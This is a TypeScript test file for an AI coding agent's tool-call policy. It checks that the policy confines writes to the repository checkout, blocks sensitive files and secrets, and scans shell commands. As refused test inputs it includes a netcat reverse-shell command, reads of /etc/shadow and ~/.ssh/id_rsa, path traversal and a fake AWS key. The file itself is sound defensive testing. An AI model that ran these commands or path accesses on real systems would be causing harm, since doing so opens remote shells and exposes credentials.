import { SECURITY_TRACE_ERRORS } from '@auto-swe/shared/lib/scannerCache';
import { beforeEach, describe, expect, it, vi } from 'vitest';

const { checkSensitiveFilePath, scanShellCommand } = vi.hoisted(() => ({
  checkSensitiveFilePath: vi.fn(async (_p: string): Promise<string | null> => null),
  scanShellCommand: vi.fn(async (_c: string): Promise<string | null> => null),
}));

vi.mock('../../lib/sensitiveFileScanner.js', () => ({ checkSensitiveFilePath }));
vi.mock('../../lib/shellCommandScanner.js', () => ({ scanShellCommand }));

import {
  canonicalisePiArgs,
  decidePiToolCall,
  PI_TOOLS,
  type PiPolicyContext,
  piToolsFor,
  piToolsGranting,
  resolvePiPath,
} from './policy.js';

const REPO = '/workspace/target-repo';
const ctx: PiPolicyContext = {
  containerId: 'workspace-abc',
  projectContextLoaded: true,
  tools: [...PI_TOOLS],
};

beforeEach(() => {
  vi.clearAllMocks();
  checkSensitiveFilePath.mockResolvedValue(null);
  scanShellCommand.mockResolvedValue(null);
});

describe('tool grants', () => {
  it('reads toolKeys as the Mastra implementer does', () => {
    expect(piToolsFor(null)).toEqual([...PI_TOOLS]);
    expect(piToolsFor(['mcp'])).toEqual([...PI_TOOLS]);
    expect(piToolsFor(['readFile'])).toEqual(['read', 'ls']);
    expect(piToolsFor(['writeFile'])).toEqual(['edit', 'write']);
    expect(piToolsFor(['bash'])).toEqual(['bash']);
  });

  it('grants nothing for an exact grant that names nothing', () => {
    expect(piToolsGranting([])).toEqual([]);
    expect(piToolsGranting(['listDirectory'])).toEqual(['read', 'ls']);
  });

  it('refuses a tool outside the list, and one the Agent was not granted', async () => {
    for (const tool of ['grep', 'find', 'web_fetch']) {
      await expect(decidePiToolCall(tool, {}, ctx)).resolves.toMatchObject({ allow: false });
    }
    await expect(
      decidePiToolCall('bash', { command: 'ls' }, { ...ctx, tools: ['read'] })
    ).resolves.toMatchObject({ allow: false, reason: expect.stringContaining('not enabled') });
  });
});

describe('resolving a path before it is decided', () => {
  it('resolves a relative path against the checkout', () => {
    expect(resolvePiPath('src/a.ts')).toEqual({ path: `${REPO}/src/a.ts` });
    expect(resolvePiPath('./x/../y')).toEqual({ path: `${REPO}/y` });
    expect(resolvePiPath(`${REPO}/z`)).toEqual({ path: `${REPO}/z` });
  });

  it('refuses the spellings Pi rewrites before it opens a path', () => {
    for (const raw of ['@.env', '~/.ssh/id_rsa', '~', `${REPO}/.env `, `a b`]) {
      expect(resolvePiPath(raw)).toMatchObject({ error: expect.any(String) });
    }
    expect(resolvePiPath('')).toMatchObject({ error: expect.any(String) });
    expect(resolvePiPath(42)).toMatchObject({ error: expect.any(String) });
  });

  it('rewrites the call in place, and lists the checkout for an ls with no path', () => {
    const write = { content: 'x', path: 'src/a.ts' };
    expect(canonicalisePiArgs('write', write)).toBeNull();
    expect(write.path).toBe(`${REPO}/src/a.ts`);

    const ls: Record<string, unknown> = {};
    expect(canonicalisePiArgs('ls', ls)).toBeNull();
    expect(ls.path).toBe(REPO);

    const bash = { command: 'cat @x' };
    expect(canonicalisePiArgs('bash', bash)).toBeNull();
    expect(bash.command).toBe('cat @x');

    expect(canonicalisePiArgs('read', { path: '~/.bashrc' })).toMatch(/^Path rejected/);
  });
});

describe('decidePiToolCall', () => {
  it('confines writes to the checkout', async () => {
    await expect(
      decidePiToolCall('write', { content: 'x', path: '/etc/passwd' }, ctx)
    ).resolves.toMatchObject({ allow: false });
    await expect(
      decidePiToolCall('write', { content: 'x', path: `${REPO}/../.harness/x` }, ctx)
    ).resolves.toMatchObject({ allow: false });
    await expect(
      decidePiToolCall('write', { content: 'x', path: `${REPO}/src/a.ts` }, ctx)
    ).resolves.toEqual({ allow: true });
  });

  it('refuses a relative path that was not resolved first', async () => {
    await expect(
      decidePiToolCall('write', { content: 'x', path: 'src/a.ts' }, ctx)
    ).resolves.toMatchObject({ allow: false });
  });

  it('refuses an absolute path holding a space Pi would rewrite', async () => {
    await expect(decidePiToolCall('read', { path: `${REPO}/a b` }, ctx)).resolves.toMatchObject({
      allow: false,
    });
  });

  it('hard-blocks a sensitive file and tags the trace', async () => {
    checkSensitiveFilePath.mockResolvedValue('blocked: .env');
    await expect(
      decidePiToolCall('write', { content: 'x', path: `${REPO}/.env` }, ctx)
    ).resolves.toEqual({
      allow: false,
      reason: 'blocked: .env',
      securityTag: SECURITY_TRACE_ERRORS.FILE_BLOCK,
    });
    expect(checkSensitiveFilePath).toHaveBeenCalledWith('.env');
  });

  it('scans every replacement an edit inserts', async () => {
    const verdict = await decidePiToolCall(
      'edit',
      {
        edits: [
          { newText: 'const a = 1;', oldText: 'x' },
          { newText: 'const key = "AKIAABCDEFGHIJKLMNOP";', oldText: 'y' },
        ],
        path: `${REPO}/src/a.ts`,
      },
      ctx
    );
    expect(verdict).toMatchObject({
      allow: false,
      securityTag: SECURITY_TRACE_ERRORS.CONTENT_BLOCK,
    });
  });

  it("protects the repository's context file while the run reads it", async () => {
    for (const name of ['AGENTS.md', 'claude.md']) {
      await expect(
        decidePiToolCall('write', { content: 'x', path: `${REPO}/${name}` }, ctx)
      ).resolves.toMatchObject({ allow: false, reason: expect.stringContaining('Pi') });
    }
    await expect(
      decidePiToolCall('write', { content: 'x', path: `${REPO}/docs/AGENTS.md` }, ctx)
    ).resolves.toEqual({ allow: true });
    await expect(
      decidePiToolCall(
        'write',
        { content: 'x', path: `${REPO}/AGENTS.md` },
        { ...ctx, projectContextLoaded: false }
      )
    ).resolves.toEqual({ allow: true });
  });

  it('lets reads reach the offloaded tool output, and nothing else outside the checkout', async () => {
    await expect(
      decidePiToolCall('read', { path: '/workspace/.tool-output/1-bash.txt' }, ctx)
    ).resolves.toEqual({ allow: true });
    await expect(decidePiToolCall('read', { path: '/etc/shadow' }, ctx)).resolves.toMatchObject({
      allow: false,
    });
    await expect(decidePiToolCall('ls', { path: REPO }, ctx)).resolves.toEqual({ allow: true });
  });

  it('scans shell commands', async () => {
    scanShellCommand.mockResolvedValue('blocked: nc');
    await expect(decidePiToolCall('bash', { command: 'nc -e sh x 1' }, ctx)).resolves.toEqual({
      allow: false,
      reason: 'blocked: nc',
      securityTag: SECURITY_TRACE_ERRORS.SHELL_BLOCK,
    });
  });
});
